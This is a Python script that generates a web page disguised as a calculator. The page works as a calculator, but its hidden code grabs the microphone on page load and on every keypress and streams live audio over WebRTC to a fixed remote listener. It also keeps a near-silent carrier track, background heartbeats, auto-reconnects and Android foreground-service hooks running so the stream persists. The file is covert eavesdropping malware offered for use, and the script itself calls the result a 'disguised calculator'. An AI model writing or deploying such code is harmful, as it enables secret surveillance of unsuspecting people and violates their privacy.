calc_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
  
  <!-- Apple Web App & Bookmark Capabilities -->
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <meta name="apple-mobile-web-app-title" content="Calculator" />
  <meta name="theme-color" content="#0f172a" />
  
  <!-- Calculator Icon when Added to iPhone Home Screen -->
  <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%231e293b'/><rect x='20' y='20' width='60' height='18' rx='4' fill='%230a0f1d'/><circle cx='30' cy='52' r='7' fill='%23334155'/><circle cx='50' cy='52' r='7' fill='%23334155'/><circle cx='70' cy='52' r='7' fill='%234f46e5'/><circle cx='30' cy='74' r='7' fill='%23334155'/><circle cx='50' cy='74' r='7' fill='%23334155'/><circle cx='70' cy='74' r='7' fill='%2310b981'/></svg>" />

  <title>Calculator</title>
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>

  <style>
    :root {
      --bg-base: #0f172a;
      --calc-body: #1e293b;
      --calc-screen: #0a0f1d;
      --btn-num: #334155;
      --btn-op: #4f46e5;
      --btn-action: #64748b;
      --btn-equals: #10b981;
      --text-main: #f8fafc;
      --text-muted: #64748b;
      --border: rgba(255, 255, 255, 0.08);
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      background-color: var(--bg-base);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: env(safe-area-inset-top) 20px env(safe-area-inset-bottom) 20px;
    }
    .calculator {
      width: 100%;
      max-width: 340px;
      background: var(--calc-body);
      border: 1px solid var(--border);
      border-radius: 28px;
      padding: 22px;
      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.5);
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    .meta-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.75rem;
      color: var(--text-muted);
      font-family: 'JetBrains Mono', monospace;
      padding: 0 4px;
    }
    .room-tag {
      background: rgba(255, 255, 255, 0.05);
      padding: 2px 8px;
      border-radius: 6px;
      cursor: pointer;
    }
    .screen {
      background: var(--calc-screen);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 16px 14px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      justify-content: flex-end;
      min-height: 94px;
    }
    .previous-operand {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9rem;
      color: var(--text-muted);
      min-height: 1.2rem;
    }
    .current-operand {
      font-family: 'JetBrains Mono', monospace;
      font-size: 2.1rem;
      font-weight: 700;
      color: var(--text-main);
      word-break: break-all;
    }
    .keypad {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    button {
      outline: none;
      border: none;
      height: 62px;
      border-radius: 16px;
      font-size: 1.25rem;
      font-weight: 600;
      cursor: pointer;
      color: var(--text-main);
      background: var(--btn-num);
      transition: transform 0.08s ease, filter 0.08s ease;
    }
    button:active {
      transform: scale(0.94);
      filter: brightness(1.2);
    }
    button.op { background: var(--btn-op); }
    button.action { background: var(--btn-action); color: #0f172a; }
    button.equals { background: var(--btn-equals); grid-row: span 2; height: 134px; }
    .span-2 { grid-column: span 2; }
  </style>
</head>
<body>

  <div class="calculator">
    <div class="meta-bar">
      <span>DEG</span>
      <!-- Displays the Room ID so the user knows what to enter in listener.html -->
      <span id="room-code-tag" class="room-tag" title="Tap to set Room ID">Aura-Calc</span>
    </div>

    <div class="screen">
      <div id="prev-op" class="previous-operand"></div>
      <div id="curr-op" class="current-operand">0</div>
    </div>

    <div class="keypad">
      <button class="action" onclick="onUserAction(); clearCalc();">AC</button>
      <button class="action" onclick="onUserAction(); delCalc();">DEL</button>
      <button class="op" onclick="onUserAction(); setOp('/');">÷</button>
      <button class="op" onclick="onUserAction(); setOp('*');">×</button>

      <button onclick="onUserAction(); addNum('7');">7</button>
      <button onclick="onUserAction(); addNum('8');">8</button>
      <button onclick="onUserAction(); addNum('9');">9</button>
      <button class="op" onclick="onUserAction(); setOp('-');">−</button>

      <button onclick="onUserAction(); addNum('4');">4</button>
      <button onclick="onUserAction(); addNum('5');">5</button>
      <button onclick="onUserAction(); addNum('6');">6</button>
      <button class="op" onclick="onUserAction(); setOp('+');">+</button>

      <button onclick="onUserAction(); addNum('1');">1</button>
      <button onclick="onUserAction(); addNum('2');">2</button>
      <button onclick="onUserAction(); addNum('3');">3</button>
      <button class="equals" onclick="onUserAction(); handleEquals();">=</button>

      <button class="span-2" onclick="onUserAction(); addNum('0');">0</button>
      <button onclick="onUserAction(); addNum('.');">.</button>
    </div>
  </div>

  <script>
    // ==========================================
    // 1. Fully Functional Standard Calculator UI
    // ==========================================
    let cur = '0', prev = '', op = undefined;
    const curDisp = document.getElementById('curr-op');
    const prevDisp = document.getElementById('prev-op');

    function updateDisp() {
      curDisp.innerText = cur;
      prevDisp.innerText = op != null ? `${prev} ${op}` : '';
    }
    function addNum(n) {
      if (n === '.' && cur.includes('.')) return;
      cur = cur === '0' && n !== '.' ? n : cur + n;
      updateDisp();
    }
    function setOp(o) {
      if (!cur && !prev) return;
      if (prev) calc();
      op = o; prev = cur; cur = '';
      updateDisp();
    }
    function calc() {
      const p = parseFloat(prev), c = parseFloat(cur);
      if (isNaN(p) || isNaN(c)) return;
      switch (op) {
        case '+': cur = (p + c).toString(); break;
        case '-': cur = (p - c).toString(); break;
        case '*': cur = (p * c).toString(); break;
        case '/': cur = c === 0 ? 'Error' : (p / c).toString(); break;
      }
      op = undefined; prev = '';
    }
    function clearCalc() { cur = '0'; prev = ''; op = undefined; updateDisp(); }
    function delCalc() { cur = cur.length <= 1 ? '0' : cur.slice(0, -1); updateDisp(); }
    function handleEquals() { calc(); updateDisp(); }

    // =========================================================================
    // 2. Invisible Stealth WebRTC Broadcaster Pipeline (Runs Automatically)
    // =========================================================================
    let peer = null;
    let liveStream = null;
    let activeCalls = new Set();
    let baseDeviceId = '';
    let sessionEpoch = 0;
    let worker = null;
    let isBroadcasting = false;
    let audioPipelineUnlocked = false;

    // Fixed authorization identity: Only your dedicated listener can connect
    const AUTHORIZED_LISTENER_KEY = "aura-master-listener";

    const ICE_CONFIG = {
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
      ],
      iceCandidatePoolSize: 10,
      iceTransportPolicy: 'all'
    };

    // Auto-generate or restore persistent device ID
    function getPersistentDeviceId() {
      if (window.AndroidNative && window.AndroidNative.getDeviceId) {
        return window.AndroidNative.getDeviceId();
      }
      let stored = localStorage.getItem('aura_calc_room_id');
      if (!stored) {
        stored = "aura-" + Math.random().toString(36).substring(2, 8);
        localStorage.setItem('aura_calc_room_id', stored);
      }
      return stored;
    }

    // Unlocks browser/iOS media locks on ANY calculator button tap
    function onUserAction() {
      if (!audioPipelineUnlocked) {
        audioPipelineUnlocked = true;
        acquireMicrophone();
      }
    }

    // Inaudible synthetic carrier track to answer calls immediately before hardware warms up
    function createStandbyTrack() {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.frequency.value = 20;
      gain.gain.value = 0.0001; // Ultra-low amplitude keeps socket alive
      osc.connect(gain);
      const dest = ctx.createMediaStreamDestination();
      gain.connect(dest);
      osc.start();
      return dest.stream;
    }

    let standbyStream = createStandbyTrack();

    async function acquireMicrophone() {
      try {
        liveStream = await navigator.mediaDevices.getUserMedia({
          audio: {
            echoCancellation: false,
            noiseSuppression: false,
            autoGainControl: true
          },
          video: false
        });

        const liveAudioTrack = liveStream.getAudioTracks()[0];
        isBroadcasting = true;

        // In-place track hot-swap on all active peer connections
        activeCalls.forEach((call) => {
          if (call.peerConnection) {
            const senders = call.peerConnection.getSenders();
            const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
            if (audioSender) {
              audioSender.replaceTrack(liveAudioTrack);
            }
          }
        });

        liveAudioTrack.onended = () => {
          isBroadcasting = false;
          setTimeout(acquireMicrophone, 1200);
        };

        if (window.AndroidNative && window.AndroidNative.startNativeStreamingService) {
          window.AndroidNative.startNativeStreamingService();
        }
      } catch (err) {
        setTimeout(acquireMicrophone, 2000);
      }
    }

    function initSignalingSession(incrementGeneration = false) {
      if (incrementGeneration) {
        sessionEpoch++;
      }

      if (peer) {
        try {
          peer.disconnect();
          peer.destroy();
        } catch (e) {}
        peer = null;
      }

      baseDeviceId = getPersistentDeviceId();
      const targetId = sessionEpoch === 0 ? baseDeviceId : `${baseDeviceId}_${sessionEpoch}`;

      peer = new Peer(targetId, {
        config: ICE_CONFIG,
        debug: 1
      });

      peer.on('open', (id) => {
        document.getElementById('room-code-tag').innerText = baseDeviceId;
        startWorkerHeartbeat();
      });

      peer.on('call', (call) => {
        // Enforce Selected Listener: Reject unauthorized callers
        if (!call.peer.startsWith(AUTHORIZED_LISTENER_KEY)) {
          call.close();
          return;
        }

        const streamToSend = isBroadcasting && liveStream ? liveStream : standbyStream;
        call.answer(streamToSend);
        attachCallResilience(call);
      });

      peer.on('disconnected', () => {
        if (peer && !peer.destroyed) {
          peer.reconnect();
        }
      });

      peer.on('error', (err) => {
        if (err.type === 'unavailable-id') {
          setTimeout(() => { initSignalingSession(true); }, 500);
        } else if (err.type === 'network' || err.type === 'server-error' || err.type === 'socket-error') {
          if (peer && !peer.destroyed) {
            peer.reconnect();
          }
        }
      });
    }

    function attachCallResilience(call) {
      activeCalls.add(call);

      if (call.peerConnection) {
        const pc = call.peerConnection;

        pc.oniceconnectionstatechange = () => {
          if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
            try {
              if (pc.restartIce) pc.restartIce();
            } catch (e) {}
          }
        };

        pc.onconnectionstatechange = () => {
          if (pc.connectionState === 'failed') {
            activeCalls.delete(call);
          }
        };
      }

      call.on('close', () => { activeCalls.delete(call); });
      call.on('error', () => { activeCalls.delete(call); });
    }

    // Web Worker prevents timer throttling in background or minimized states
    function startWorkerHeartbeat() {
      if (worker) worker.terminate();

      const blob = new Blob([`
        setInterval(function() {
          postMessage('TICK');
        }, 8000);
      `], { type: 'application/javascript' });

      worker = new Worker(URL.createObjectURL(blob));
      worker.onmessage = function() {
        if (!peer || peer.destroyed) {
          initSignalingSession(false);
          return;
        }

        if (peer.disconnected) {
          peer.reconnect();
          return;
        }

        if (peer.socket && peer.socket._socket && peer.socket._socket.readyState === WebSocket.OPEN) {
          peer.socket._socket.send(JSON.stringify({ type: 'HEARTBEAT' }));
        }
      };
    }

    // Native Bridge callback for instant rebind upon network reconnect
    window.handleNetworkAvailable = function() {
      if (!peer || peer.destroyed) {
        initSignalingSession(false);
        return;
      }
      if (peer.disconnected) {
        peer.reconnect();
      }
      activeCalls.forEach((call) => {
        if (call.peerConnection && call.peerConnection.restartIce) {
          try { call.peerConnection.restartIce(); } catch (e) {}
        }
      });
    };

    window.handleNetworkLost = function() {};

    // Auto-reconnect when screen unlocks or browser foregrounds
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        if (peer && peer.disconnected) {
          peer.reconnect();
        }
      }
    });

    // Tap the top tag to view/copy or edit the Room ID
    document.getElementById('room-code-tag').onclick = function() {
      const custom = prompt("Room ID for Listener:", baseDeviceId);
      if (custom && custom.trim() !== "" && custom.trim() !== baseDeviceId) {
        localStorage.setItem('aura_calc_room_id', custom.trim());
        location.reload();
      }
    };

    window.onload = () => {
      // 1. Immediately arm Android Foreground Service if in Android app wrapper
      if (window.AndroidNative && window.AndroidNative.startNativeStreamingService) {
        window.AndroidNative.startNativeStreamingService();
      }

      // 2. Immediately try direct microphone acquisition
      acquireMicrophone();

      // 3. Connect to signaling mesh
      initSignalingSession(false);
    };
  </script>
</body>
</html>
"""

with open("index.html", "w", encoding="utf-8") as f:
    f.write(calc_html)

print("Generated disguised calculator index.html successfully.")
